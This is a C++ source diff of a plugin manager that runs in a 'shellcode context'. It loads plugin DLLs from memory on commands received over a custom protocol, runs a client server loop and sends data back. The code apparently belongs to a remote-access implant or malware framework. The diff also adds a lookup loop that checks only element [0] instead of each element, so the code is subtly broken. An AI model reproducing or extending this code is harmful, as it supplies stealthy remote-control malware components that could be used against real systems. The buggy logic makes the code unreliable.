@@ -1,12 +1,10 @@
-#include <stdio.h>
-
 #include "PluginManager.h"
 #include "plugininterface.h"
+#include "arraylist.h"
 
 FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName);
 
-bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
-                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result);
+bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,const void *data, LPCWSTR dllname, PMEMORYMODULE result);
 void WINAPI FreeLibraryFromMemory(SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);
 
 //int __cdecl printf(const char*, ...);
@@ -17,7 +15,8 @@ class pluginEvent{
         ulong size;
 };
 
-PluginManagerInterfacePrivate* PluginManager::pluginList;
+//PluginManagerInterfacePrivate* PluginManager::pluginList;
+ArrayList<PluginManagerInterfacePrivate*>* PluginManager::pluginList;
 
 class PluginManagerInterfacePrivate :public pluginManagerInterface{
         PluginManager* mgr;
@@ -31,15 +30,19 @@ class PluginManagerInterfacePrivate :public pluginManagerInterface{
 };
 
 PluginManager::PluginManager(){
-    pluginList = 0;
+    if(!pluginList)
+		pluginList = new ArrayList<PluginManagerInterfacePrivate*>();
 }
 
 PluginManager::~PluginManager(){
     if(pluginList){
         DebufPrintf("unloading plugin\n");
-        //__asm__("int3");
-        delete pluginList->p->plugInterface;
-        ::FreeLibraryFromMemory(Context,&pluginList->getPlugInformation()->Module);
+        while(pluginList->size()) {
+            FreeLibraryFromMemory(Context,&(*pluginList)[0]->getPlugInformation()->Module);
+            delete (*pluginList)[0];
+            pluginList->remove(0);
+        }
+        delete pluginList;
     }
 }
 
@@ -55,23 +58,26 @@ uint PluginManager::run(SHELLCODE_CONTEXT* Context){
     return client.serverLoop();
 }
 
-bool PluginManager::updateServer(DArray& /*newServer*/){
+bool PluginManager::updateServer(DArray& /*newServer*/){/*
     char FileName[1024];
     char FileNameNew[1024];
     long FilenameSize;
     FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);
 
-    strcpy(FileNameNew,FileName);
+    StringCchCopy(FileNameNew,1024,FileName);
+
     FileNameNew[FilenameSize] = '_';
     FileNameNew[FilenameSize+1] = 0;
 
-    MoveFile(FileName,FileNameNew);
+    MoveFile(FileName,FileNameNew);^*/
 
     return true;
 }
+
 int exception(){
     return EXCEPTION_CONTINUE_SEARCH;
 }
+
 bool WINAPI LoadLibraryFromMemory(SHELLCODE_CONTEXT* pSCC,
                                    const void *data, LPCWSTR dllname, PMEMORYMODULE result){
     int status = 0;
@@ -145,14 +151,14 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
                 DebufPrintf("[pm] getInterface \n");
                 newPlugin->ID = pluginModule->PluginID;
                 pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
-                pluginList = pluginPrivate;
+                //pluginList = pluginPrivate;
+                pluginList->add(pluginPrivate);
                 result = true;
             }else{
                 DebufPrintf("[pm] getInterface not fund\n");
                 if(!getInterface){
-                    uint error = (uint)GetLastError();
-                    DebufPrintf("GetProcAddress error: %x(%s)\n",error,
-                           error==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
+                    DebufPrintf("GetProcAddress error: %x(%s)\n",(uint)GetLastError(),
+                           (uint)GetLastError()==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
                     FreeLibraryFromMemory(Context,&newPlugin->Module);
                 }
                 delete newPlugin;
@@ -164,8 +170,16 @@ bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
     return result;
 }
 
-plugin* PluginManager::getPluginById(ulong /*id*/){
-    return pluginList->getPlugInformation();
+plugin* PluginManager::getPluginById(ulong id){
+    plugin* result = null;
+    if(pluginList)
+        for (int i = 0; i < pluginList->size(); ++i) {
+            if((*pluginList)[0]->getPlugInformation()->ID == id){
+                result = (*pluginList)[0]->getPlugInformation();
+                break;
+            }
+    }
+    return result;
 }
 
 RPEP *PluginManager::getProtocol(){
@@ -174,11 +188,7 @@ RPEP *PluginManager::getProtocol(){
 
 bool PluginManager::isPluginLoad(ushort ID){
     DebufPrintf("[pm] isPluginLoad \n");
-    bool result = false;
-    if(pluginList && pluginList->getPlugInformation()){
-        result = pluginList->getPlugInformation()->ID == ID;
-    }
-    return result;
+    return getPluginById(ID)!= null;
 }
 
 PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr, plugin &p){
@@ -197,7 +207,7 @@ int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
         DArray buff;
 
         this->mgr->getProtocol()->MakePacket(buff,(ushort)this->p->ID,data,size);
-        return this->mgr->getProtocol()->send(buff.data,buff.size);
+        return this->mgr->getProtocol()->send(buff.data(),buff.size());
     }
     return 0;
 }
